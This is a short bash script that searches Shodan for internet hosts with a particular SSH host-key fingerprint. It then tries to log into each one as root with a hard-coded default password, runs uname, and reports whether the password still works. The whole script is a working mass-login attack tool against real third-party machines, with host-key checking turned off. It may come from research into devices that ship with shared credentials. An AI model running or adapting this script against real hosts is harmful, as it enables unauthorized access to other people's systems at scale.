#!/bin/bash
fingerprint=7c:b8:1c:49:60:f8:b2:be:69:44:6f:8a:22:cc:0c:44
user=root
password=glasshouse

for ip in $(shodan search $fingerprint |  awk '{print $1}') ; do 
    echo -n "$ip "
    if sshpass -p${password} ssh -o PubkeyAuthentication=no -o ConnectTimeout=10 -o StrictHostKeyChecking=no $user@$ip /bin/uname -a 2>/dev/null ; then
        echo password not changed, exit code: $?
    else
        echo password changed, exit code: $?
    fi
done

